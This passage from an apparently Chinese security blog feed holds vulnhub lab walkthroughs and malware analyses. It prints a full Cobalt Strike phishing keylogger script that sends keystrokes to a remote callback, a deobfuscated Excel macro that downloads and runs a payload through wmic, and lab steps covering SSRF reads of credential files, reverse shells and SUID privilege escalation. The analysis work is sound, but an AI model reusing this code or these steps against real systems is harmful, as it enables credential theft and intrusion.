title="总结"></a>总结</h2><p>混淆的cs，配合Dropbox做c2是个不错的选择</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;事件来源&quot;&gt;&lt;a href=&quot;#事件来源&quot; class=&quot;headerlink&quot; title=&quot;事件来源&quot;&gt;&lt;/a&gt;事件来源&lt;/h2&gt;&lt;p&gt;事件来源：&lt;a href=&quot;https://www.proofpoint.com/us/blog/threat-insigh</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub ARAGOG</title>
    <link href="http://422926799.github.io/posts/21b3e8d6.html"/>
    <id>http://422926799.github.io/posts/21b3e8d6.html</id>
    <published>2021-06-16T12:46:42.000Z</published>
    <updated>2021-06-16T13:18:25.393Z</updated>
    
    <content type="html"><![CDATA[<p>靶场链接:<a href="http://www.vulnhub.com/entry/harrypotter-aragog-102,688/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/harrypotter-aragog-102,688/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap<br><img src="https://z3.ax1x.com/2021/06/16/2XcHoQ.png" alt=""></p><p>gobuster web扫描<br><img src="https://z3.ax1x.com/2021/06/16/2XcOWn.png" alt=""></p><p>访问/blog发现是个wordpress<br><img src="https://z3.ax1x.com/2021/06/16/2XgR7F.png" alt=""></p><p>需要添加hosts  (这里我已经添加了)<br><img src="https://z3.ax1x.com/2021/06/16/2X2FHS.png" alt=""></p><p>wpscan扫描wordpress<br>（存在wp-admin用户）<br><img src="https://z3.ax1x.com/2021/06/16/2X2e9s.png" alt=""></p><p>插件扫描,存在wp-file-manager插件，版本6.0</p><pre><code>wpscan --url http://aragog.hogwarts/blog -t 20 --plugins-detection aggressive</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2X2e9s.png" alt=""></p><p>这个版本存在任意文件上传，利用该洞getshell即可<br><img src="https://z3.ax1x.com/2021/06/16/2XRCG9.png" alt=""></p><p>得到shell<br><img src="https://z3.ax1x.com/2021/06/16/2XRix1.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>得到flag，并得知/home目录下查找ginny和hagrid98用户<br><img src="https://z3.ax1x.com/2021/06/16/2XRtIg.png" alt=""></p><p>原本以为/var/www/html下是存放wordpress的路径，查看后发现不是。最后在/usr/share/wordpress发现数据库配置文件</p><pre><code>find / -maxdepth 5 -type f -writable 2&gt; /dev/null | grep -v &quot;/proc&quot;find / -maxdepth 5 -type f -writable 2&gt; /dev/null | grep -v &quot;/proc&quot; | grep &quot;config&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2XR4Q1.png" alt=""></p><p>查询数据库得到wp-admin用户的密码</p><pre><code>use wordpress;select * from wp_users;</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2XRjSA.png" alt=""></p><p>cmd5查询得到密码<br><img src="https://z3.ax1x.com/2021/06/16/2XWpef.png" alt=""></p><p>ssh撞密码得<br><img src="https://z3.ax1x.com/2021/06/16/2XWVln.png" alt=""></p><p>后续常规linux提权检测发现没有有用的东西，上pspy检测root权限的进程，最后发现有个定时任务执行/opt/.backup.sh<br><img src="https://z3.ax1x.com/2021/06/16/2XWBfH.png" alt=""></p><p>里面插入反弹shell等待即可获得root shell<br><img src="https://z3.ax1x.com/2021/06/16/2XW6Xt.png" alt=""></p><h2 id="wp-file-任意文件上传分析"><a href="#wp-file-任意文件上传分析" class="headerlink" title="wp-file 任意文件上传分析"></a>wp-file 任意文件上传分析</h2><p>漏洞点位于file manager的connector.minimal.php文件，具体路径在wordpress\wp-content\plugins\wp-file-manager\lib\php\connector.minimal.php<br><img src="https://z3.ax1x.com/2021/06/16/2XW7Xq.png" alt=""></p><p>首先实例化一个elFinderConnector对象，然后调用它的run()方法，跟进run()<br>跟进到FILES数据判断<br><img src="https://z3.ax1x.com/2021/06/16/2XfpcR.png" alt=""></p><p>最后调用exec函数进入到文件上传处理点<br><img src="https://z3.ax1x.com/2021/06/16/2XfAAO.png" alt=""></p><p>Upload函数（关键点是Content-Type类型存在image即进入文件保存）<br><img src="https://z3.ax1x.com/2021/06/16/2Xf8US.png" alt=""></p><p>详细分析链接:<a href="https://www.anquanke.com/post/id/216990" target="_blank" rel="noopener">https://www.anquanke.com/post/id/216990</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;靶场链接:&lt;a href=&quot;http://www.vulnhub.com/entry/harrypotter-aragog-102,688/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.vulnhub.com/entry/harry</summary>
      
    
    
    
    
    <category term="靶场练习" scheme="http://422926799.github.io/tags/靶场练习/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub HarryPotter:Nagini</title>
    <link href="http://422926799.github.io/posts/a52d611e.html"/>
    <id>http://422926799.github.io/posts/a52d611e.html</id>
    <published>2021-06-14T15:53:34.000Z</published>
    <updated>2021-06-14T18:07:28.924Z</updated>
    
    <content type="html"><![CDATA[<p>vulnhub链接：<a href="http://www.vulnhub.com/entry/harrypotter-nagini,689/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/harrypotter-nagini,689/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap</p><pre><code>nmap -sV -A 192.168.93.225</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HE0Gd.png" alt=""></p><p>gobuster扫web</p><pre><code>gobuster dir -e -u http://192.168.93.225 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,rar,7z</code></pre><p><img src="https://z3.ax1x.com/2021/06/14/2HAxDf.png" alt=""></p><p>有个joomla CMS，进入后台就能通过模板getshell，除此之外还有个note.txt。访问如下<br><img src="https://z3.ax1x.com/2021/06/15/2HEXi4.png" alt=""></p><blockquote><p>提示用http3访问quic.nagini.hogwarts，将域添加进/etc/hosts</p></blockquote><p>得到提示的路径<br><img src="http://www.vxer.cn/zb_users/upload/2021/05/202105071620395007860213.png" alt="vxer.cn的图"></p><p>访问internalResourceFeTcher.php，存在SSRF漏洞<br>读取internalResourceFeTcher.php源码</p><pre><code>file:///var/www/html/internalResourceFeTcher.php</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HVidO.png" alt=""> </p><p>读取/etc/passwd<br><img src="https://z3.ax1x.com/2021/06/15/2HVVWd.png" alt=""></p><p>读取joomla CMS数据库配置文件</p><pre><code>file:///var/www/html/joomla/configuration.php</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HVuOP.png" alt=""></p><p>可以发现mysql没使用密码进行登录，意味着可以用ssrf访问mysql<br>》MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行</p><h2 id="突破口"><a href="#突破口" class="headerlink" title="突破口"></a>突破口</h2><p>利用gopherus.py生成gopher payload<br><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p><p><img src="https://z3.ax1x.com/2021/06/15/2HV2Ox.png" alt=""></p><blockquote><p>注意:然后我们必须使用浏览器的 url 访问该站点。（curl 在这里不起作用。）如果没有显示内容，只需刷新页面几次。<br><img src="https://z3.ax1x.com/2021/06/15/2HVWm6.png" alt=""></p></blockquote><p>数据库版本<br><img src="https://z3.ax1x.com/2021/06/15/2HVwwT.png" alt=""></p><p>查看joomla数据库所有表<br><img src="https://z3.ax1x.com/2021/06/15/2HZkn0.png" alt=""></p><p>读取joomla_users<br><img src="https://z3.ax1x.com/2021/06/15/2HZABV.png" alt=""></p><p>查看后发现hash无法破解，直接将md5替换掉site_admin的用户然后在登录即可<br><img src="https://z3.ax1x.com/2021/06/15/2HZeNF.png" alt=""></p><p>登录后台<br>joomla/administrator<br><img src="https://z3.ax1x.com/2021/06/15/2HZu9J.png" alt=""></p><p>找到模板处写shell<br>(尝试phpinfo)<br><img src="https://z3.ax1x.com/2021/06/15/2HZK39.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HZQj1.png" alt=""></p><p>php_reverse_shell<br><img src="https://z3.ax1x.com/2021/06/15/2HZwjI.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>home目录下有两个用户snape,hermoine<br><img src="https://z3.ax1x.com/2021/06/15/2HZDDP.png" alt=""></p><p>在/home/snape目录下找到hermoine用户的ssh密码<br><img src="https://z3.ax1x.com/2021/06/15/2HuYqI.png" alt=""></p><p>登录后利用发现的SUID cp文件，将ssh公钥拷贝到/home/hermoine/.ssh/authorized_keys<br><img src="https://z3.ax1x.com/2021/06/15/2HuNZt.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuUdP.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuaIf.png" alt=""></p><p>实现私钥登录hermoine用户<br><img src="https://z3.ax1x.com/2021/06/15/2Huwi8.png" alt=""></p><p>用户目录下存在firefox的数据，scp下载到本地解密得到root密码<br><a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0" target="_blank" rel="noopener">https://github.com/unode/firefox_decrypt/releases/tag/0.7.0</a><br><img src="https://z3.ax1x.com/2021/06/15/2Hu0JS.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuBRg.png" alt=""></p><p>得到最后的flag<br><img src="https://z3.ax1x.com/2021/06/15/2HuDzQ.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.vxer.cn/?id=80" target="_blank" rel="noopener">http://www.vxer.cn/?id=80</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vulnhub链接：&lt;a href=&quot;http://www.vulnhub.com/entry/harrypotter-nagini,689/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.vulnhub.com/entry/harr</summary>
      
    
    
    
    
    <category term="靶场" scheme="http://422926799.github.io/tags/靶场/"/>
    
  </entry>
  
  <entry>
    <title>hacksudo fgo</title>
    <link href="http://422926799.github.io/posts/2f666841.html"/>
    <id>http://422926799.github.io/posts/2f666841.html</id>
    <published>2021-06-10T12:16:16.000Z</published>
    <updated>2021-06-10T12:30:42.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap扫描<br><img src="https://z3.ax1x.com/2021/06/10/2RY6O0.png" alt=""></p><p>开放了80、21、3306、22</p><p>路径扫描<br><img src="https://z3.ax1x.com/2021/06/10/2RYRTU.png" alt=""></p><p>访问dict.txt得到一份字典，ftp爆破。得到正确密码<br><img src="https://z3.ax1x.com/2021/06/10/2RYXkD.png" alt=""></p><p>ftp登录上去，发现两个目录。东西全部下载下来<br><img src="https://z3.ax1x.com/2021/06/10/2RtAAS.png" alt=""></p><p>其中压缩包里wav后缀结尾的文件是凯撒加密，解密得到后台密码<br><img src="https://z3.ax1x.com/2021/06/10/2Rtm1s.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RtUj1.png" alt=""></p><p>文件上传copy改名得到shell</p><p><img src="https://z3.ax1x.com/2021/06/10/2Rt69H.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RtDAO.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>得到shell<br><img src="https://z3.ax1x.com/2021/06/10/2RtggA.png" alt=""></p><p>发现SUID<br><img src="https://z3.ax1x.com/2021/06/10/2Rt5E8.png" alt=""></p><p>利用look读取/etc/shadow<br><img src="https://z3.ax1x.com/2021/06/10/2RtzUU.png" alt=""></p><p>john破解hash<br><img src="https://z3.ax1x.com/2021/06/10/2RNC8J.png" alt=""></p><p>登录得到user.txt，发现该用户目录下存在二进制文件fog<br><img src="https://z3.ax1x.com/2021/06/10/2RNEb6.png" alt=""></p><p>经过IDA分析，发现是setuid(0)/setguid(0)后调用python，而属主是root。可利用其提权<br><img src="https://z3.ax1x.com/2021/06/10/2RNrq0.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RNtIS.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;开局nmap扫描&lt;br&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/06/10/2RY6O0.pn</summary>
      
    
    
    
    
    <category term="靶场练习" scheme="http://422926799.github.io/tags/靶场练习/"/>
    
  </entry>
  
  <entry>
    <title>cs钓鱼克隆网站分析</title>
    <link href="http://422926799.github.io/posts/9efc32ef.html"/>
    <id>http://422926799.github.io/posts/9efc32ef.html</id>
    <published>2021-06-10T09:49:12.000Z</published>
    <updated>2021-06-10T09:54:48.840Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>cs克隆<br><img src="https://z3.ax1x.com/2021/06/10/2RieSA.png" alt=""></p><p>克隆后的html和原html对比<br><img src="https://z3.ax1x.com/2021/06/10/2RilTS.png" alt=""></p><p>特征：</p><ol><li>IFRAME标签为大写，且长宽为0。</li><li>script标签加载了js路径为”/jquery/jquery.min.js”</li></ol><p>顺序特征:</p><ol><li>IFRAME标签和script标签同时出现时，一定是IFRAME标签、script标签和body标签这个顺序。</li><li>IFRAME标签和script标签只出现一个时，一定在body标签之前。</li></ol><p>引用的js分析：</p><pre><code class="javascript">var cfqPdaQzXzSSf = 0;window.onload = function loadfqPdaQzXzSSf() { //页面加载处理事件    lfqPdaQzXzSSf = &quot;,&quot;;    if (window.addEventListener)  { //对象触发指定的事件        document.addEventListener(&#39;keypress&#39;, pfqPdaQzXzSSf, true); //keypress所有键都会触发该事件，无论它们是否产生字符值 处理函数:pfqPdaQzXzSSf        document.addEventListener(&#39;keydown&#39;, dfqPdaQzXzSSf, true); //keydown当按下某个键时会触发该事件 处理函数:dfqPdaQzXzSSf    } else if (window.attachEvent)  { //attachEvent在IE9以下的版本中受到支持。其它的都支持addEventListener        document.attachEvent(&#39;onkeypress&#39;, pfqPdaQzXzSSf);        document.attachEvent(&#39;onkeydown&#39;, dfqPdaQzXzSSf);    } else { //两者都不支持全部置空        document.onkeypress = pfqPdaQzXzSSf;        document.onkeydown = dfqPdaQzXzSSf;    }}function pfqPdaQzXzSSf(e) {    kfqPdaQzXzSSf = (window.event)?window.event.keyCode:e.which; //只有当DOM事件处理程序被调用的时    kfqPdaQzXzSSf = kfqPdaQzXzSSf.toString(16); //将键盘码转换为ascii    if (kfqPdaQzXzSSf != &quot;d&quot;)  { //随便写个判断进入函数        fqPdaQzXzSSf(kfqPdaQzXzSSf);    }}function dfqPdaQzXzSSf(e) {    kfqPdaQzXzSSf = (window.event)?window.event.keyCode:e.which;    if (kfqPdaQzXzSSf == 9||kfqPdaQzXzSSf == 8||kfqPdaQzXzSSf == 13)  { //tab键，退格键，回车键        fqPdaQzXzSSf(kfqPdaQzXzSSf);    }}function fqPdaQzXzSSf(kfqPdaQzXzSSf) {    lfqPdaQzXzSSf = lfqPdaQzXzSSf + kfqPdaQzXzSSf + &quot;,&quot;; //键盘值拼接    var tfqPdaQzXzSSf = &quot;ZUyQXfawhPbi&quot; + cfqPdaQzXzSSf;    cfqPdaQzXzSSf++;    var ffqPdaQzXzSSf;    if (document.all&amp;&amp;(navigator.appVersion.match(/MSIE ([\d.]+)/)[1]) &lt;= 8.0)  { //浏览器版本判断是否小于或等于8.0        ffqPdaQzXzSSf = document.createElement(String.fromCharCode(60) + &quot;script name=&#39;&quot;+tfqPdaQzXzSSf+&quot;&#39; id=&#39;&quot;+tfqPdaQzXzSSf+&quot;&#39;&quot; + String.fromCharCode(62) + String.fromCharCode(60) + &quot;/script&quot; + String.fromCharCode(62));    } else {        ffqPdaQzXzSSf = document.createElement(&quot;script&quot;);        ffqPdaQzXzSSf.setAttribute(&quot;id&quot;, tfqPdaQzXzSSf);        ffqPdaQzXzSSf.setAttribute(&quot;name&quot;, tfqPdaQzXzSSf);    }    var ejDBFWFHhff = &#39;?id=&#39; + window.location.href.split(/\?id=/)[1]; //取键盘ascii码    ffqPdaQzXzSSf.setAttribute(&quot;src&quot;, &quot;http://10.23.66.18:8080/callback&quot; + ejDBFWFHhff + &quot;&amp;data=&quot; + lfqPdaQzXzSSf);    ffqPdaQzXzSSf.style.visibility = &quot;hidden&quot;;    document.body.appendChild(ffqPdaQzXzSSf); //实例化js，发送键盘码    if (kfqPdaQzXzSSf == 13||lfqPdaQzXzSSf.length &gt; 3000)  { //判断键盘码为回车键置空lfqPdaQzXzSSf变量        lfqPdaQzXzSSf = &quot;,&quot;;    }    setTimeout(&#39;document.body.removeChild(document.getElementById(&quot;&#39; + tfqPdaQzXzSSf + &#39;&quot;))&#39;, 5000); //延时5秒删除创建的js}</code></pre><p>页面加载处理事件,添加针对键盘按下的事件。触发事件的时候进入dfqPdaQzXzSSf和dfqPdaQzXzSSf函数处理，最后调用fqPdaQzXzSSf函数，将键盘码通过创建script标签将数据传送到远端。最后延迟5秒后删除创建的js</p><p>pfqPdaQzXzSSf函数：<br>键盘码转ascii码发送到fqPdaQzXzSSf函数</p><p>dfqPdaQzXzSSf函数：<br>如果按下tab键，退格键，回车键调用fqPdaQzXzSSf函数发送键盘</p><p><strong>chrome动态调试</strong><br><img src="https://z3.ax1x.com/2021/06/10/2RiDkF.png" alt="键盘码判断"></p><p><img src="https://z3.ax1x.com/2021/06/10/2RirY4.png" alt="键盘码拼接"></p><p><img src="https://z3.ax1x.com/2021/06/10/2Ri7pd.png" alt="js创建发送键盘码到远端"></p><p>cs远端接收的密码<br><img src="https://z3.ax1x.com/2021/06/10/2RiqXt.png" alt=""></p><p>360空间绘测特征搜索：</p><pre><code>response:&quot;&lt;head&gt; &lt;base href=&quot; AND response:&quot;&lt;link rel=\&quot;shortcut icon\&quot; type=\&quot;image/x-icon\&quot; href=\&quot;/favicon.ico\&quot;&gt;&quot; AND response:&quot;jquery/jquery.min.js\&quot;&gt;&lt;/script&gt; &lt;/body&gt;&quot;response:&quot;&lt;head&gt; &lt;base href=&quot; AND response:&quot;&lt;link rel=\&quot;shortcut icon\&quot; type=\&quot;image/x-icon\&quot; href=\&quot;/favicon.ico\&quot;&gt;&quot; AND response:&quot;WIDTH=\&quot;0\&quot; HEIGHT=\&quot;0\&quot;&gt;&lt;/IFRAME&gt;&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/06/10/2RF9pj.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/1lZlqxTuEcS3VK1Ve8XDbA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1lZlqxTuEcS3VK1Ve8XDbA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;分析过程&quot;&gt;&lt;a href=&quot;#分析过程&quot; class=&quot;headerlink&quot; title=&quot;分析过程&quot;&gt;&lt;/a&gt;分析过程&lt;/h2&gt;&lt;p&gt;cs克隆&lt;br&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/06/10/2RieSA.png&quot; a</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>仿造Brown-Forman恶意文档分析</title>
    <link href="http://422926799.github.io/posts/5245e2ed.html"/>
    <id>http://422926799.github.io/posts/5245e2ed.html</id>
    <published>2021-06-08T17:47:43.000Z</published>
    <updated>2021-06-08T18:00:24.180Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>信息来源：<a href="https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m" target="_blank" rel="noopener">https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m</a><br><img src="https://z3.ax1x.com/2021/06/09/2so9S0.png" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>VT查杀：<a href="https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection</a></p><pre><code>MD5    4fb331e4e5c6094e731690371687b110SHA-1    bcecaaba6462550c61f7ed572e2c06ef8f3f378aSHA-256    b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7feVhash    ec726ed39dd1773fb0790767871cde5cSSDEEP    12288:HMc+2YnB6YTbkvA00E+XvQNBzcytqew5W99QPR69Ke+SajzvEnj/igo7tbhzdSNN:H8sYvkhRzdoW9yRCh+vwnj/it7vBSjTLSH    T148F423A542CEFD48EA3A3D3761C5039DA197ACEB93150F420E73DB22D99A6F32511F18</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2so30e.png" alt=""></p><p>执行流程<br><img src="https://z3.ax1x.com/2021/06/09/2so8TH.png" alt=""></p><p>下载下来，打开是典型的隐藏表执行宏<br><img src="https://z3.ax1x.com/2021/06/09/2soJkd.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/09/2soYtA.png" alt=""></p><p>逐个提取出里面的vba，得到的结果是这样的<br><img src="https://z3.ax1x.com/2021/06/09/2sod6f.png" alt=""></p><pre><code>Auto_Open=AB16() ;=FORMULA.ARRAY(&#39;reierj ntrutruiret eruireur&#39;!AJ17&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ18&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ19&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ20&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ21&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ22&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ23&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ24,AB17)=Z16() ;Z16=CALL(AB17,AC17,&quot;JCJ&quot;,AD16,0) //Kernel32,,JCJ,C:/Users/Public,0=CALL(&quot;UR&quot;&amp;&#39;reierj ntrutruiret eruireur&#39;!AM18,&#39;reierj ntrutruiret eruireur&#39;!AN17&amp;&#39;reierj ntrutruiret eruireur&#39;!AN18&amp;&#39;reierj ntrutruiret eruireur&#39;!AN19&amp;&#39;reierj ntrutruiret eruireur&#39;!AN20&amp;&#39;reierj ntrutruiret eruireur&#39;!AN21&amp;&#39;reierj ntrutruiret eruireur&#39;!AN22&amp;&#39;reierj ntrutruiret eruireur&#39;!AN23&amp;&#39;reierj ntrutruiret eruireur&#39;!AN24&amp;&#39;reierj ntrutruiret eruireur&#39;!AN25&amp;&#39;reierj ntrutruiret eruireur&#39;!AN26&amp;&#39;reierj ntrutruiret eruireur&#39;!AN27&amp;&#39;reierj ntrutruiret eruireur&#39;!AN28&amp;&#39;reierj ntrutruiret eruireur&#39;!AN29&amp;&#39;reierj ntrutruiret eruireur&#39;!AN30&amp;&#39;reierj ntrutruiret eruireur&#39;!AN31&amp;&#39;reierj ntrutruiret eruireur&#39;!AN32&amp;&#39;reierj ntrutruiret eruireur&#39;!AN33&amp;&#39;reierj ntrutruiret eruireur&#39;!AD17,AH24,0,A96,&#39;reierj ntrutruiret eruireur&#39;!AD16&amp;&#39;reierj ntrutruiret eruireur&#39;!AE16,0,0) //URLMon URLDownloadToFileA JJCCBB,0,https://opposedent.com/css/main.css  C:/Users/Public//send.css=AE25()  ;EXEC(&quot;wmic process call create &#39;C:/Users/Public/send.css&#39;&quot;)//远程下载https://opposedent.com/css/main.css 保存在C:/Users/Public/send.css，wmic创建进程执行C:/Users/Public/send.css</code></pre><p><strong> main.css </strong><br>MD5    6f891127db5efdb86a63c7a60a96103f<br>SHA-1    590945c764eb6acccadba94c02d0bc710886f865<br>SHA-256    944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b<br>Vhash    075066551d1d15155az5e!z<br>Authentihash    da7ab1728350ba9cf4a5f8dfa807d89002ad70db8c76829562500c0044776b37<br>Imphash    60f1da2d26406f6f3578f73785af8e9a<br>Rich PE header hash    004ccbc588d0cc025f006eb509f7f855<br>SSDEEP    12288:cGMMRFE7g6Ys/K7zyfuJTsQp4Cp6y5SrL1znr2LphlYuGUoPavYWIJdvrQoDpNkr:9zwRYs/K7ziuKU4jALFYuGDQ2vQoDkRN<br>TLSH    T10AF48D307A52C038F5FB21F85AA9DE34941DBAB0671C68CB63D55EE9D6385F89C3021B<br>PE查询结果<br><img src="https://z3.ax1x.com/2021/06/09/2soBnS.png" alt=""></p><p>VC写的，x86，开了ASLR<br><img src="https://z3.ax1x.com/2021/06/09/2soD0g.png" alt=""></p><p>整体流程是：</p><pre><code>1. 延时几秒2. 反调试检测3. 获取当前进程路径4. 读取自身，设置文件指针，文件数据读取5. 内存区域更改6. 加载执行</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2sor7Q.png" alt=""></p><p>反调试检测<br><img src="https://z3.ax1x.com/2021/06/09/2soykj.png" alt=""></p><p>加载对应的DLL和实例化对应的API<br><img src="https://z3.ax1x.com/2021/06/09/2so6ts.png" alt=""></p><p>读取自身<br><img src="https://z3.ax1x.com/2021/06/09/2sochn.png" alt=""></p><p>加载对应的DLL和API<br><img src="https://z3.ax1x.com/2021/06/09/2so2pq.png" alt=""></p><p>内存加载的PE<br><img src="https://z3.ax1x.com/2021/06/09/2soR10.png" alt=""></p><p>调试过一遍后，没看出什么危险的操作。利用沙箱运行得到以下结果<br><a href="https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013" target="_blank" rel="noopener">https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013</a><br><img src="https://z3.ax1x.com/2021/06/09/2soWcV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/09/2sofXT.png" alt=""></p><h2 id="技术总结"><a href="#技术总结" class="headerlink" title="技术总结"></a>技术总结</h2><pre><code>1. Excel隐藏表执行宏2. 反调试，反沙箱3. 读取自身内存加载PE执行</code></pre><p>能力有限，勿喷</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;信息来源：&lt;a href=&quot;https://nitter.domain.glass/Arkbird_SOLG/status/14008454</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>HackSudo Aliens靶场</title>
    <link href="http://422926799.github.io/posts/be372d38.html"/>
    <id>http://422926799.github.io/posts/be372d38.html</id>
    <published>2021-06-06T16:48:20.000Z</published>
    <updated>2021-06-06T17:08:13.809Z</updated>
    
    <content type="html"><![CDATA[<p>vulnhub的一个靶场<br>链接：<a href="http://www.vulnhub.com/entry/hacksudo-aliens,676/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/hacksudo-aliens,676/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap<br><img src="https://z3.ax1x.com/2021/06/07/2dmTbj.png" alt=""></p><p>两个web，一个开了phpmyadmin<br>常规路径扫描<br><img src="https://z3.ax1x.com/2021/06/07/2dmban.png" alt=""></p><p>访问得到mysql.bak，拿到mysql连接凭证。phpmyadmin登录<br><img src="https://z3.ax1x.com/2021/06/07/2dmvxU.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnPaR.png" alt=""></p><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>查看secure_file_priv，可以写shell<br><img src="https://z3.ax1x.com/2021/06/07/2dnERK.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dneMD.png" alt=""></p><p>用php_reverse_shell.php反弹个shell<br><img src="https://z3.ax1x.com/2021/06/07/2dnMdA.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnKZd.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>常规提权检测<br>1./etc/passwd是否可写<br>2.内核版本查询<br>3.suid和sudo查询<br>……<br>发现date有SUID权限，利用其读取/root/root.txt<br>拿到root.txt:)<br><img src="https://z3.ax1x.com/2021/06/07/2dnQII.png" alt=""></p><p>读取/root/.bash_history看到操作日志切换到hacksudo用户后给Downloads下的cpulimit设置了SUID<br><img src="https://z3.ax1x.com/2021/06/07/2dndds.png" alt=""></p><p>用date读取/etc/shadow<br><img src="https://z3.ax1x.com/2021/06/07/2dnwon.png" alt=""></p><p>拿到hacksudo hash，john爆破得到明文<br><img src="https://z3.ax1x.com/2021/06/07/2dnBiq.png" alt=""></p><p>登录后拿到users.txt<br>利用cpulimit执行/bin/bash，获得root<br><img src="https://z3.ax1x.com/2021/06/07/2dnDJ0.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnrWV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnszT.png" 